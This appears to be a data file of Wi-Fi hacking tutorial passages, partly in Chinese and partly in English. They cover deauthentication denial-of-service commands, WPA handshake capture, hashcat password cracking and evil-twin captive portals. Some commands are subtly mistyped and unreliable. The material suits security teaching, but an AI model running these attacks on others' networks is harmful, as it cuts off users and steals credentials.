  trans: "\n数据包注入允许你制作并注入或发送数据到附近的无线设备和网络。数据包注入通常用于中间人攻击和拒绝服务攻击。\n\n## 确定芯片组\n\n芯片组很重要，因为它将决定无线网卡是否支持监听模式和数据包注入。\n\
    \n最好的芯片组，也是大多数 Wi-Fi 渗透测试人员使用的，是`Atheros AR9271`。该芯片组支持数据包注入、监听模式和主模式，这使得它可以用作接入点来创建用于邪恶双胞胎攻击的虚假热点。\n\
    \n`Alfa AWUS036NHA` USB 适配器采用了`Atheros AR9271`芯片组。它稳定、快速，并且是支持良好的无线网络适配器。\n\n\
    还有`TP-Link TL-WN722N`无线适配器，它价格最便宜之一，但性能却出奇地出色。话虽如此，只有 v1 版本使用了 Atheros 芯片组，因为\
    \ v2 版本使用了不同的芯片组。\n\n## 将你的网卡设置为监听模式\n\n在这一步，我们将使用`airmon-ng`，但在此之前，你需要找到接口的名称。在你的系统上，在终端中运行命令`ifconfig`。在你的\
    \ Linux 系统上，你的网卡应该被列为`wlan0`或`wlan1`。\n\n```\nifconfig\n```\n\n```\neth0: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>\
    \  mtu 1500\n        inet 10.0.2.15  netmask 255.255.255.0  broadcast 10.0.2.255\n\
    \        inet6 fe80::a00:27ff:fe59:1b52  prefixlen 64  scopeid 0x20<link>\n  \
    \      ether 86:09:15:d2:9e:97  txqueuelen 1000  (Ethernet)\n        RX packets\
    \ 0  bytes 0 (0.0 B)\n        RX errors 0  dropped 0  overruns 0  frame 0\nwlan0:\
    \ flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500\n        ether EE-A5-3C-37-34-4A\
    \  txqueuelen 1000  (Ethernet)\n        RX packets 0  bytes 0 (0.0 B)\n      \
    \  RX errors 0  dropped 0  overruns 0  frame 0\n```\n\n一旦你有了网络接口的名称，你可以尝试通过输入`airmon-ng\
    \ start wlan0`（假设你的接口名称是`wlan0`）将其设置为监听模式。\n\n```\nairmon-ng start wlan0\n```\n\
    \n你可以通过输入`iwconfig`来确认结果，你应该会看到你的接口名称已更改为`wlan0mon`。它还应该报告“Mode:Monitor”。\n\n\
    ```\niwconfig\n```\n\n```\nwlan0mon  IEEE 802.11  Mode:Monitor  Frequency:2.457\
    \ GHz  Tx-Power=20 dBm\n          Retry short  long limit:2  RTS thr:off  Fragment\
    \ thr:off\n          Power Management:off\n```\n\n## 测试你的网卡是否支持数据包注入\n\n将你的网卡设置为监听模式后，你可以运行一个测试，看看无线网卡是否能够向附近的无线网络注入数据包。\n\
    \n因此，在终端窗口中，输入`aireplay-ng --test wlan0mon`来启动数据包注入测试。\n\n```\naireplay-ng --test\
    \ wlan0mon\n```\n\n```\n12:47:05  Waiting for beacon frame (BSSID: AA:BB:CC:DD:EE)\
    \ on channel 6\n12:47:05  Trying broadcast probe requests...\n12:47:06  Injection\
    \ is working!\n12:47:07  Found 1 AP\n12:47:07  Trying directed probe requests...\n\
    12:47:07  AA:BB:CC:DD:EE - channel: 6 - 'Dobis'\n12:47:08  Ping (min/avg/max):\
    \ 0.891ms/15.899ms/32.832ms  Power: -21.72\n12:47:08  29/30:  97%\n```\n\n如果你得到类似上面的结果，那么恭喜你，你的网卡已成功向附近网络注入数据包。\n\
    \n# 对无线网络执行拒绝服务攻击\n\n去认证攻击是一种针对用户与无线 Wi-Fi 接入点之间通信的拒绝服务攻击。去认证是一个涉及路由器或 AP 告诉 Wi-Fi\
    \ 用户断开连接的请求。\n\n该过程的特点是去认证数据包导致目标客户端与接入点失去连接。\n\n## 接入点去认证\n\n攻击者可以向接入点发送去认证请求。此操作导致\
    \ AP 向所有连接到无线网络的设备发送去认证响应。\n\n这意味着恶意行为者可以转发无限数量的去认证请求，而设备将无法连接到 AP，从而导致 DoS 攻击。\n\
    \n## 客户端去认证\n\n攻击者向已连接设备的接入点发送请求，要求 AP 对已连接设备进行去认证。\n\n通常，可以发送的去认证数据包数量没有限制。\n\
    \n同时，用户的设备从 AP 接收到去认证响应数据包后，将无法同时向同一 AP 发送认证数据包。此过程使得设备无法连接到该 AP。\n\n## 如何执行攻击\n\
    \n首先，你需要使用`airmon-ng`将无线网卡设置为监听模式。\n\n```\nairmon-ng start wlan0\n```\n\n此命令会将你的无线接口名称更改为`wlan0mon`。\n\
    \n### 扫描 WiFi 网络\n\n使用`airodump-ng`扫描范围内的所有接入点。\n\n```\nairodump-ng wlan0mon\n\
    ```\n\n你会得到一堆不同的接入点以及很多你不理解的信息！让我们来分解一下。\n\n- `BSSID` — 接入点的 MAC 地址\n- `PWR` —\
    \ 信号强度\n- `Beacons` — 路由器发送出来以宣告其存在的数据包\n- `CH` — 信息正在广播的信道\n- `AUTH` — MGT 表示托管模式，PSK\
    \ 表示预共享密钥\n- `ESSID` — 接入点的网络名称\n- `STATION` — 客户端的 MAC 地址\n\n找到你想执行 DoS 攻击的目标后，按`Ctrl+c`停止扫描。\n\
    \n### 去认证 AP 上的所有用户\n\n要从 AP 上去认证所有用户，你需要发送数千个去认证帧，以防止任何人重新连接到 AP。你可以通过在另一个终端中输入以下命令来完成此操作。\n\
    \n```\naireplay-ng --deauth 2000 -a 28:EF:01:35:34:85 wlan0mon\n```\n\n此命令将断开所有人与接入点（Orange-Net）的连接。\n\
    \n### 断开无线客户端连接\n\n找到你想要从网络中踢出的设备的 MAC 地址。\n\n为此，请查看`airodump-ng`扫描屏幕的底部，并从`STATION`中选择\
    \ MAC 地址。（目标的 MAC 地址将在“STATION”字段中）。\n\n因此，如果你知道路由器的 MAC 地址和设备的 MAC 地址，请使用以下命令：\n\
    \n```\naireplay-ng --deauth 2000 -a [ROUTER_BSSID] -c [TARGET_MAC_ADDRESS] wlan0mon\n\
    ```\n\n```\naireplay-ng --deauth 2000 -a 28:EF:01:35:34:85 -c 28:EF:01:23:46:68\
    \ wlan0mon\n```\n\n`2000`代表去认证数据包的数量。\n\n`-c`是你想要从网络中踢出的客户端。\n\n`-a`是受害者连接的路由器。\n\
    \n`wlan0mon`是处于监听模式的无线网卡的名称。\n\n# 使用 Hashcat 破解 WiFi 密码\n\n`Hashcat`是一个强大的密码恢复工具，可以帮助你恢复各种平台（包括\
    \ Windows、Linux 和 macOS）上丢失或遗忘的密码。\n\n`Hashcat`也是少数可以使用 GPU 工作的工具之一，并提供了多种从哈希值中查找密码的方法。\n\
    \n破解哈希值最简单的方法是首先尝试猜测密码。字典攻击和暴力破解攻击是最常见的密码猜测方法。\n\n这些技术利用一个包含单词、短语、常用密码以及其他可能用作密码的字符串的文件。\n\
    \n## 启用监听模式\n\n首先，你需要使用以下命令将你的无线网卡设置为监听模式。\n\n```\nairmon-ng start wlan0\n```\n\
    \n我将假设你的无线接口名称是`wlan0`，但如果不同，请确保使用正确的名称。你可以使用`iwconfig`命令来查找无线接口名称。\n\n## 找到你的目标\n\
    \n使用以下命令开始扫描附近的无线路由器。\n\n```\nairodump-ng wlan0\n```\n\n这将显示范围内所有 Wi-Fi 路由器的数据表。\n"
- fmt: "For the purposes of this demo, I will choose to crack the password of my network,\
    \ \"SkyNet\".\n\nNext, I need the access point MAC address (BSSID) and channel\
    \ from the network. Let’s open another terminal and type:\n\n```\nairodump-ng—bssid\
    \ 28:EF:01:35:34:85 -c 6—write wpa-01 wlan0\n```\n\n`— write wpa-01` is the file\
    \ name where you write the data, and where the 4-way handshake will be stored.\n\
    \n![img](d2d_images/image034.jpg)\n\nYou can use the `ls` command to see the file,\
    \ which later on you need to convert to a different format in order to crack the\
    \ password.\n\n## Capture a WPA/WPA2 Handshake\n\nWPA/WPA2 uses a 4-way handshake\
    \ to authenticate devices to the network. In order to capture the 4-way authentication\
    \ handshake, you need to have the client authenticate to the AP.\n\nIf they’re\
    \ already authenticated, you can de-authenticate them (kick them off), and their\
    \ system will automatically re-authenticate, whereby you can grab the 4-way handshake\
    \ in the process. Open another terminal and type:\n\n```\naireplay-ng -0 100 -a\
    \ 28:EF:01:35:34:85 -c 28:EF:01:23:46:68 wlan0\n```\n\n![img](d2d_images/image003.jpg)\n\
    \nIn the screen above, notice the \"WPA handshake: 28:EF:01:35:34:85\" in the\
    \ top right-hand corner. This means `airodump-ng` has successfully captured the\
    \ handshake.\n\n## Convert the .cap file to .hccap format\n\nBefore you crack\
    \ the password, you need to convert the `.cap` file (`wpa-01.cap`) to the hashcat\
    \ file format `.hc22000`. This can be done very quickly by uploading the `.cap`\
    \ file to [https://hashcat.net/cap2hashcat](https://hashcat.net/cap2hashcat) and\
    \ converting it to `.hc22000` format.\n\n![img](d2d_images/image068.jpg)\n\n##\
    \ Cracking WPA/WPA2 handshake\n\nHashcat is very flexible, so I’ll cover the two\
    \ most common attacks:\n\n*   Dictionary attack\n*   Brute-force attack\n\n###\
    \ Dictionary attack\n\nIn addition to `hashcat`, you will also need a wordlist.\
    \ A word list is a list of commonly used passwords in a big text file.\n\nA popular\
    \ password wordlist is `rockyou.txt`. It contains a list of commonly used passwords\
    \ and is popular among pen testers. You can find the `rockyou` wordlist under\
    \ `/usr/share/wordlists` in Kali Linux.\n\nNow, use the following command to start\
    \ the cracking process:\n\n```\nhashcat -m 22000 wpa-01.hc22000 rockyou.txt\n\
    ```\n\nIn this command, I am starting `hashcat` in `22000` mode, which is for\
    \ attacking WPA network protocols. Next, specify the name of the file you want\
    \ to crack, in my case is `wpa-01.hc22000`, and lastly `rockyou.txt` is the wordlist\
    \ file.\n\n![img](d2d_images/image017.jpg)\n\nThe password was successfully cracked\
    \ and is \"justletmein\".\n\n### Brute-Force Attack\n\nThe brute force attack\
    \ is based on trying out every possible combination, which leads to an immense\
    \ number of possible combinations as the password length increases. To start the\
    \ attack, use the following command:\n\n```\nhaschcat -m 2200 -a 3 wpa-01.hc22000\
    \ ?l ?l ?l ?l ?l ?l ?l ?l ?l ?l\n```\n\n`-a 3` means you are using Brute Force\
    \ Attack mode.\n\n`wpa-01.hc22000` = is the converted `.cap` file.\n\n`?l ?l ?l\
    \ ?l ?l ?l ?l ?l ?l ?l` = This is your mask where `l` = lowercase letters. This\
    \ means the password is all in lowercase letters.\n\nHashcat allows you to use\
    \ the following built-in charsets to attack a WPA /WPA2 handshake file.\n\n```\n\
    ?l = abcdefghijklmnopqrstuvwxyz?u = ABCDEFGHIJKLMNOPQRSTUVWXYZ?d = 0123456789?h\
    \ = 0123456789abcdef?H = 0123456789ABCDEF?s = «space»!\"#$%&'()*+,-./:;<=>?@[\\\
    ]^_`{&#124;}~ \n```\n\nSo let's say your password is `87654321`. You can use a\
    \ custom mask like `?d?d?d?d?d?d?d?d`\n\nThis means you’re trying to break an\
    \ 8-digit number password like `87654323` or `43446789`...\n\n![img](d2d_images/image058.jpg)\n\
    \nHere you can see the password is \"justletmein\" So, I’m using the lowercase\
    \ letters mask (`?l = abcdefghijklmnopqrstuvwxyz`) to crack the password.\n\n\
    ![img](d2d_images/chapter_title_corner_decoration_left.png) | | ![img](d2d_images/chapter_title_corner_decoration_right.png)\n\
    \n![img](d2d_images/chapter_title_above.png)\n\n# Intro to Evil Twin and Captive\
    \ Portals\n\n![img](d2d_images/chapter_title_below.png)\n\nAn evil twin is a fake\
    \ wireless access point that appears as a genuine hotspot offered by a legitimate\
    \ provider.\n\nThe idea is to set up a malicious wireless network with the same\
    \ SSID name as the original one.\n\nDevices connecting to a Wi-Fi network like\
    \ laptops, tablets, and smartphones have no way to distinguish between two Wi-Fi\
    \ networks with the same SSID name.\n\nThis enables hackers to set up malicious\
    \ wireless networks that can capture the traffic and extract sensitive information\
    \ from victims.\n\n## Attack Methodology\n\n1.  Attacker scans the air for the\
    \ target access point information like SSID name, Channel number, and MAC Address.\n\
    2.  He then uses that information to create an access point with the same characteristics.\n\
    3.  Clients on the legitimate AP are repeatedly disconnected, forcing them to\
    \ connect to the malicious access point.\n4.  As soon as the client is connected\
    \ to the fake access point, she/he may start browsing the Internet.\n5.  Client\
    \ opens up a browser window and sees a web login page saying “Please login to\
    \ access the internet.”\n6.  The client enters the password, she/he will be redirected\
    \ to a loading page, and the password is stored in the database of the attacker's\
    \ machine.\n\n## Captive Portals\n\nA captive portal is a web page that is displayed\
    \ to newly connected users of a Wi-Fi network before they are granted access to\
    \ the network.\n\nCaptive portals are typically used by business centers, airports,\
    \ hotel lobbies, coffee shops, and other places that offer free Wi-Fi hotspots\
    \ for internet users.\n\nUsers can freely connect to these networks without a\
    \ password and will often be directed to a login page where a password is required\
    \ before being allowed to browse the web.\n\nThe danger in using these types of\
    \ networks is that an attacker can create a clone of the access point with the\
    \ same login page and trick users to connect to the fake network.\n\n![img](d2d_images/chapter_title_corner_decoration_left.png)\
    \ | | ![img](d2d_images/chapter_title_corner_decoration_right.png)\n\n![img](d2d_images/chapter_title_above.png)\n\
    \n# Set up an Access Point with Hostapd\n\n![img](d2d_images/chapter_title_below.png)\n\
    \nIn this chapter, you’ll learn how to set up a Wi-Fi Access Point using `hostapd`,\
    \ a popular open-source software package for creating Wi-Fi networks on Linux\
    \ systems.\n\n## Install Hostapd & Dnsmasq\n\nFor the Access Point to work, you’ll\
    \ need two items:\n\n*   `hostapd` — the Access Point software.\n*   `dnsmasq`\
    \ — a DHCP server that will provide IP addresses to the clients.\n\nSo, start\
    \ up the Linux system, and in the terminal type:\n\n```\napt install dnsmasq hostapd\n\
    ```\n\n## Set up the Access Point\n\nRun the `iwconfig` command to see the available\
    \ wireless network interfaces (`wlan0`, `wlan1`...).\n\n![img](d2d_images/image029.jpg)\n\
    \nUse a wireless device that supports Access Point Mode. In my case, I am using\
    \ a wireless adapter with chipset Atheros AR9271 with interface name `wlan0`.\n\
    \nOnce you have identified your wireless interface, set up the configuration files\
    \ using the `nano` text editor in the terminal.\n\n```\nnano dnsmasq.conf\n```\n\
    \nAnd add the following lines.\n\n```\n#Set the wireless interfaceinterface=wlan0#Set\
    \ the IP range for the clientsdhcp-range=192.168.1.2,192.168.1.250,12h#Set the\
    \ gateway IP addressdhcp-option=3,192.168.1.1#Set DNS server addressdhcp-option=6,192.168.1.1\n\
    ```\n\nThis configuration file will tell `dnsmasq` to use the `wlan0` device and\
    \ start handing out IP addresses to the clients in the range of `192.168.1.2`\
    \ through `192.168.1.250`. Don’t forget to save the file.\n\nNext, I am going\
    \ to create another configuration file, this time called `hostapd.conf`. Open\
    \ the terminal window and create the file using `nano`.\n\n```\nnano hostapd.conf\n\
    ```\n\nAdd the following lines:\n\n```\n#Set wireless interfaceinterface=wlan0#Set\
    \ network namessid=Test-WiFi#Set channelchannel=11#Set driverdriver=nl80211\n\
    ```\n\nIn the example above, an Access Point is defined with the network name\
    \ \"Test-WiFi\", and it will run on channel 11, using wireless network interface\
    \ `wlan0`."
